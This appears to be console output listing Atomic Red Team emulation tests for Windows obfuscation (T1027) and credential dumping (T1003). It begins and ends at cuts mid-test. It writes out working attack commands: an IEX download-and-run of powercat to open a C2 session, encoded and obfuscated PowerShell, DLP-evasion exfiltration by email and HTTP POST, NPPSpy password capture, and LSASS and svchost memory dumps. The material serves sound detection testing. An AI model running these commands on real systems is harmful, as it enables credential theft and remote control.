Atomic Test GUID: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
Description: Start C2 Session Using Powercat To start the listener on a Linux device, type the following:  nc -l -p <port>

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}
Command (with inputs):
IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c 127.0.0.1 -p 80
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Execute base64-encoded PowerShell
Atomic Test Number: 2
Atomic Test GUID: a50d5a97-2531-499e-a1de-5544c74432c6
Description: Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.
Upon successful execution, powershell will execute an encoded command and stdout default is "Write-Host "Hey, Atomic!"

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
Command (with inputs):
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Execute base64-encoded PowerShell from Windows Registry
Atomic Test Number: 3
Atomic Test GUID: 450e7218-7915-4be4-8b9b-464a49eafcec
Description: Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.
Upon successful execution, powershell will execute encoded command and read/write from the registry.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
Command (with inputs):
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"

Cleanup Commands:
Command:
Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}
Command (with inputs):
Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Execution from Compressed File
Atomic Test Number: 4
Atomic Test GUID: f8c8a909-5f29-49ac-9244-413936ce6d1f
Description: Mimic execution of compressed executable. When successfully executed, calculator.exe will open.

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027.zip\T1027.exe"

Cleanup Commands:
Command:
taskkill /f /im calculator.exe >nul 2>nul
taskkill /f /im CalculatorApp.exe >nul 2>nul

Dependencies:
Description: T1027.exe must exist on disk at C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027.zip\T1027.exe
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027.zip\T1027.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\" -Force
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1027.zip"
Expand-Archive -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1027.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027.zip\" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: DLP Evasion via Sensitive Data in VBA Macro over email
Atomic Test Number: 5
Atomic Test GUID: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
Description: Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email. Sensitive data includes about around 20 
odd simulated credit card numbers that passes the LUHN check.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments "#{input_file}" -SmtpServer #{smtp_server}
Command (with inputs):
Send-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments "C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm" -SmtpServer 127.0.0.1
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
Atomic Test Number: 6
Atomic Test GUID: e2d85e66-cb66-4ed7-93b1-833fc56c9319
Description: Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP. Sensitive data includes about around 20 o
dd simulated credit card numbers that passes the LUHN check.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}"
Command (with inputs):
Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Obfuscated Command in PowerShell
Atomic Test Number: 7
Atomic Test GUID: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
Description: This is an obfuscated PowerShell command which when executed prints "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-
','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,
155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Snake Malware Encrypted crmlog file
Atomic Test Number: 9
Atomic Test GUID: 7e47ee60-9dd1-4269-9c4f-97953b183268
Description: The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign 
and is later decrypted by Snake's kernel driver. [Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Ho
st "File created: $($file.FullName)"

Cleanup Commands:
Command:
$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = "$env:windir\registration\"; $fullPathToDelete = Join-Path
 $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host "File deleted: $fullPathToDelete" } else { Write-Host 
"File not found: $fullPathToDelete" }
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Obfuscated Files or Information T1027
Atomic Test Name: Execution from Compressed JScript File
Atomic Test Number: 10
Atomic Test GUID: fad04df1-5229-4185-b016-fb6010cd87ac
Description: Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcana
ry.com/blog/gootloader/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"

Cleanup Commands:
Command:
taskkill /f /im calculator.exe >nul 2>nul

Dependencies:
Description: T1027.js must exist on disk at C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027js.zip\T1027js.js") {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force
Get Prereq Command (with inputs):
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1027js.zip"
Expand-Archive -path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1027js.zip" -DestinationPath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\temp_T1027js.zip\" -Force
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

Found 0 atomic tests applicable to windows platform for Technique T1027.002
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

ERROR: C:\AtomicRedTeam\atomics\T1027.005\T1027.005.yaml does not exist
Check your Atomic Number and your PathToAtomicsFolder parameter
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Gsecdump
Atomic Test Number: 1
Atomic Test GUID: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
Description: Dump credentials from memory using Gsecdump.
Upon successful execution, you should see domain\username's followed by two 32 character hashes.
If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus.  You will receive only error output if you do not run this te
st from an elevated context (run as administrator)
If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{gsecdump_exe}" -a
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe" -a

Dependencies:
Description: Gsecdump must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe)
Check Prereq Command:
if (Test-Path "#{gsecdump_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
  Move-Item $binpath "#{gsecdump_exe}"
}
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$parentpath = Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"
IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CA
EFFDCD7628A02A112FB3CBA36698EF72BC){
  Move-Item $binpath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe"
}
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Credential Dumping with NPPSpy
Atomic Test Number: 2
Atomic Test GUID: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6
Description: Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy. After user's logging in cleartext password is saved in C:\NPPSpy.txt. Clean up deletes the files
 and reverses Registry changes. NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" 
-ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
Command (with inputs):
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" 
-ErrorAction Ignore
echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"

Cleanup Commands:
Command:
$cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore

Dependencies:
Description: NPPSpy.dll must be available in ExternalPayloads directory
Check Prereq Command:
if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\..\ExternalPayl
oads\NPPSPY.dll"
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "C:\AtomicRedTeam\atomics\..\Externa
lPayloads\NPPSPY.dll"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Dump svchost.exe to gather RDP credentials
Atomic Test Number: 3
Atomic Test GUID: d400090a-d8ca-4be0-982e-c70598a23de9
Description: The svchost.exe contains the RDP plain-text credentials. Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full

Cleanup Commands:
Command:
Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
Atomic Test Number: 4
Atomic Test GUID: 6c7a4fd3-5b0b-4b30-a93e-39411b25d889
Description: AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured fo
r the webserver. An adversary may use these credentials for other malicious purposes. [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*

Dependencies:
Description: IIS must be installed prior to running the test
Check Prereq Command:
if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {exit 1}
Get Prereq Command:
Install-WindowsFeature -name Web-Server -IncludeManagementTools
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)
Atomic Test Number: 5
Atomic Test GUID: 42510244-5019-48fa-a0e5-66c3b76e6049
Description: AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured 
for the webserver. An adversary may use these credentials for other malicious purposes. [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config

Dependencies:
Description: IIS must be installed prior to running the test
Check Prereq Command:
if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {exit 1}
Get Prereq Command:
Install-WindowsFeature -name Web-Server -IncludeManagementTools
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Dump Credential Manager using keymgr.dll and rundll32.exe
Atomic Test Number: 6
Atomic Test GUID: 84113186-ed3c-4d0d-8a3c-8980c86c1f4a
Description: This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials 
from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. T
he only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling
 RDP, etc.). Reference: https://twitter.com/0gtweet/status/1415671356239216653

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
rundll32.exe keymgr,KRShowKeyMgr
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe Memory using ProcDump
Atomic Test Number: 1
Atomic Test GUID: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals ProcDump.
Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{procdump_exe}" -accepteula -ma lsass.exe #{output_file}
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp

Cleanup Commands:
Command:
del "#{output_file}" >nul 2> nul
Command (with inputs):
del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul

Dependencies:
Description: ProcDump tool from Sysinternals must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe)
Check Prereq Command:
if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump.zip"
Expand-Archive "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump.zip" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe") -Force | Out-Null
Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Procdump\Procdump.exe" "C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe" -Force
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe Memory using comsvcs.dll
Atomic Test Number: 2
Atomic Test GUID: 2536dee2-12fb-459a-8c37-971844fa73be
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.

Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full

Cleanup Commands:
Command:
Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping: LSASS Memory T1003.001
Atomic Test Name: Dump LSASS.exe Memory using direct system calls and API unhooking
Atomic Test Number: 3
Atomic Test GUID: 7ae7102c-a099-45c8-b985-4c7a2d05790d
Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid dete
ction.  https://github.com/outflanknl/Dumpert https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ Upon successful execution,
 you should see the following file created C:\\windows\\temp\\dumpert.dmp.
If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
"#{dumpert_exe}"
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe"

Cleanup Commands:
Command:
del C:\windows\temp\dumpert.dmp >nul 2> nul

Dependencies:
Description: Dumpert executable must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe)
Check Prereq Command:
if (Test-Path "#{dumpert_exe}") {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe") {exit 0} else {exit 1}
Get Prereq Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory (Split-Path "#{dumpert_exe}") -Force | Out-Null
Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile "#{dumpert_exe}"
Get Prereq Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe") -Force | Out-Null
Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile "C:\AtomicRedTeam\atomics\..\Ext
ernalPayloads\Outflank-Dumpert.exe"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
